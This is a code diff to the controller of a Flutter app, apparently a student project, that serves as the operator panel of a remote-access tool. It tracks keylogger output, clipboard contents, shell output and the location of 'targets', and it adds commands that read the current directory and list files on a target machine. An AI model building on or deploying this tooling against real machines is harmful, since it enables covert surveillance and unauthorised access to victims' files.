@@ -1,7 +1,6 @@
 import 'package:flutter/material.dart';
 import 'package:get/get.dart';
-import 'package:get/get_rx/get_rx.dart';
-import 'package:get/get_rx/src/rx_types/rx_types.dart';
+import 'package:inferno_core_fyp/models/file_model.dart';
 import 'package:inferno_core_fyp/models/process_model.dart';
 import 'package:inferno_core_fyp/res/helper_extensions.dart';
 
@@ -11,22 +10,20 @@ import '../../utils/utils.dart';
 import 'io_attacker_controller.dart';
 
 class GeneralController extends GetxController {
-  RxInt selectedIndex = 0.obs;
-  RxBool isClipboard = true.obs, isTaskManagerEnabled = true.obs;
-  RxString sysModelName = ''.obs, sysRam = ''.obs, sysOS = ''.obs;
+  RxInt selectedIndex = 0.obs, maxLines = 1.obs;
+  RxBool isClipboard = true.obs, isTaskManagerEnabled = true.obs, loading = false.obs;
+  RxDouble cpuUsage = 0.0.obs, usedRam = 0.0.obs, totalRam = 1.0.obs;
 
+  RxString sysModelName = ''.obs, sysRam = ''.obs, sysOS = ''.obs;
   RxString clipboardData = 'No data'.obs,
       keyloggerData = ''.obs,
       hostFileData = ''.obs,
       shellData = ''.obs;
-
   RxString publicIP = ''.obs,
       country = ''.obs,
       city = ''.obs,
+      currentDir = ''.obs,
       showInTable = ''.obs;
-  RxInt maxLines = 1.obs;
-
-  RxDouble cpuUsage = 0.0.obs, usedRam = 0.0.obs, totalRam = 1.0.obs;
 
   Rx<HardwareInfo> hardwareInfo = HardwareInfo(
     cpuUsage: '',
@@ -40,6 +37,7 @@ class GeneralController extends GetxController {
   RxList<DataRow> networkData = <DataRow>[].obs;
   RxList<Process> processes = <Process>[].obs;
   RxList<Program> programs = <Program>[].obs;
+  RxList<FileItem> files = <FileItem>[].obs;
 
   final generalController = TextEditingController().obs;
 
@@ -204,6 +202,7 @@ class GeneralController extends GetxController {
     }
   }
 
+
   Future<void> getHostFile(String targetId) async {
     try {
       Map<String, dynamic> response = await ioAttackerController.executeCommand(
@@ -260,4 +259,46 @@ class GeneralController extends GetxController {
       Utils.toastMsg("Error: $e");
     }
   }
+
+  Future<void> getCurrentDirAndFiles(String targetId, String sessionId) async {
+    await Future.delayed(const Duration(seconds: 1));
+    try {
+      loading.value = true;
+      Map<String, dynamic> response = await ioAttackerController.executeCommand(
+        targetId: targetId,
+        data: {
+          "text": "GETCWD",
+          "command_args": {
+            "session_id": sessionId
+          }
+        },
+      );
+      currentDir.value = response["result"];
+      await getFilesInDirectory(targetId, sessionId);
+      loading.value = false;
+    } catch (e) {
+      loading.value = false;
+      Utils.toastMsg("Error: $e");
+    }
+  }
+
+  Future<void> getFilesInDirectory(String targetId, String sessionId) async {
+    try {
+      Map<String, dynamic> response = await ioAttackerController.executeCommand(
+        targetId: targetId,
+        data: {
+          "text": "LIST_CURRENT_DIRECTORY",
+          "command_args": {
+            "session_id": sessionId,
+            "path": currentDir.value
+          }
+        },
+      );
+      FileItemsResponse fileItemsResponse = FileItemsResponse.fromJson(response);
+      files.value = fileItemsResponse.result;
+    } catch (e) {
+      Utils.toastMsg("Error: $e");
+    }
+  }
+
 }
